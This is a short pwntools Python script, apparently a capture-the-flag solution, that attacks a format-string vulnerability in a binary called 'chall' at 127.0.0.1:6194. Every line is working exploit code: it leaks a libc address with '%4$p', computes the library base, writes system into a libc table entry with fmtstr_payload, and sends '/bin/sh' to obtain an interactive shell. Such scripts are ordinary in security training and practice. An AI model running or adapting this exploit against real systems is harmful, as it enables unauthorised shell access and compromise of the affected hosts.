#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
exe = context.binary = ELF('./chall')

libc=ELF("./libc.so.6")
# io = process("./chall")
io = remote("127.0.0.1", 6194)

io.sendline(b"%4$p")
libc.address=int(io.recvline().strip(b"\n"), 16)-0x21aef0
print(hex(libc.address))
io.sendline(fmtstr_payload(8, {libc.address+0x2190b8 : libc.sym.system}, write_size='short'))
io.recv()
io.sendline(b"/bin/sh\x00")
io.interactive()

